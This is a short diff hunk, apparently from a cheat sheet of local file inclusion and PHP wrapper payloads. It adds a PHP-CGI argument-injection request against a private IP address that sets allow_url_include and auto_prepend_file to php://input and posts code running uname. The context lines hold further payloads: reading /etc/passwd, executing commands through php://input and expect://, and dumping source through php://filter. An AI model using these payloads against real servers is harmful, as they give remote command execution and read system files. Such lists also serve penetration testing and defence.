@@ -250,6 +250,8 @@ file:///etc/passwd
 
 http://example.com/index.php?page=php://input&cmd=ls
     POST: <?php system($_GET['cmd']); ?>
+http://192.168.2.237/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
+    POST: <?php system('uname -a');die(); ?>
 
 expect://whoami
 http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
